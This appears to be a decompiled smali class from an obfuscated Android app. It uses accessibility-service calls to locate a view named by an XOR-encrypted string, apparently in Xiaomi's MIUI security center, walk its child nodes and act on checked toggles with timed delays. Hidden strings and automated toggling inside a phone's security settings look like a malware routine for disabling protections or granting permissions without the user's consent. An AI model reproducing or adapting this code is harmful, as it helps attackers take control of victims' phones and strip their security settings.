.class Lcom/vknnolqo/p9sv5zvf/JQgPaybB$f$a;
.super Ljava/lang/Object;
.source "SourceFile"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/vknnolqo/p9sv5zvf/JQgPaybB$f;->run()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic e:Lcom/vknnolqo/p9sv5zvf/JQgPaybB$f;


# direct methods
.method constructor <init>(Lcom/vknnolqo/p9sv5zvf/JQgPaybB$f;)V
    .locals 0

    iput-object p1, p0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB$f$a;->e:Lcom/vknnolqo/p9sv5zvf/JQgPaybB$f;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method public static synthetic a(Lcom/vknnolqo/p9sv5zvf/JQgPaybB$f$a;Landroid/view/accessibility/AccessibilityNodeInfo;)V
    .locals 0

    .line 1
    invoke-direct {p0, p1}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB$f$a;->b(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    return-void
.end method

.method private synthetic b(Landroid/view/accessibility/AccessibilityNodeInfo;)V
    .locals 1

    .line 1
    if-eqz p1, :cond_0

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->isCheckable()Z

    move-result v0

    if-eqz v0, :cond_0

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->isChecked()Z

    move-result v0

    if-eqz v0, :cond_0

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p1

    new-instance v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB$f$a$a;

    invoke-direct {v0, p0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB$f$a$a;-><init>(Lcom/vknnolqo/p9sv5zvf/JQgPaybB$f$a;)V

    invoke-static {p1, v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->v0(Landroid/view/accessibility/AccessibilityNodeInfo;Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ui;)V

    :cond_0
    return-void
.end method


# virtual methods
.method public run()V
    .locals 7

    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    const/16 v1, 0x28

    new-array v1, v1, [B

    fill-array-data v1, :array_0

    const/16 v2, 0x8

    new-array v3, v2, [B

    fill-array-data v3, :array_1

    invoke-static {v1, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->b(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-eqz v0, :cond_5

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v1

    invoke-static {v2, v1}, Ljava/lang/Math;->min(II)I

    move-result v1

    new-instance v2, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v3

    invoke-direct {v2, v3}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    const/4 v3, 0x0

    :goto_0
    if-ge v3, v1, :cond_5

    invoke-virtual {v0, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v4

    if-nez v4, :cond_0

    goto :goto_1

    :cond_0
    invoke-virtual {v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v5

    if-nez v5, :cond_1

    goto :goto_1

    :cond_1
    add-int/lit8 v5, v5, -0x1

    invoke-virtual {v4, v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v4

    if-nez v4, :cond_2

    goto :goto_1

    :cond_2
    invoke-virtual {v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v5

    if-nez v5, :cond_3

    goto :goto_1

    :cond_3
    add-int/lit8 v5, v5, -0x1

    invoke-virtual {v4, v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v4

    if-nez v4, :cond_4

    goto :goto_1

    :cond_4
    mul-int/lit16 v5, v3, 0xc8

    new-instance v6, Lcom/vknnolqo/p9sv5zvf/TGnosvod;

    invoke-direct {v6, p0, v4}, Lcom/vknnolqo/p9sv5zvf/TGnosvod;-><init>(Lcom/vknnolqo/p9sv5zvf/JQgPaybB$f$a;Landroid/view/accessibility/AccessibilityNodeInfo;)V

    int-to-long v4, v5

    invoke-virtual {v2, v6, v4, v5}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    :goto_1
    add-int/lit8 v3, v3, 0x1

    goto :goto_0

    :cond_5
    return-void

    :array_0
    .array-data 1
        0x59t
        -0x7bt
        -0x5ft
        0x1t
        0x36t
        0x6ct
        0x1et
        0x5ft
        0x14t
        -0x67t
        -0x57t
        0x4ct
        0x2et
        0x77t
        0x2t
        0x42t
        0x43t
        -0x77t
        -0x57t
        0x41t
        0x2ft
        0x60t
        0x19t
        0xct
        0x53t
        -0x72t
        -0x1dt
        0x5dt
        0x3et
        0x66t
        0x12t
        0x55t
        0x56t
        -0x71t
        -0x42t
        0x70t
        0x2dt
        0x6ct
        0xet
        0x41t
    .end array-data

    :array_1
    .array-data 1
        0x3at
        -0x16t
        -0x34t
        0x2ft
        0x5bt
        0x5t
        0x6bt
        0x36t
    .end array-data
.end method
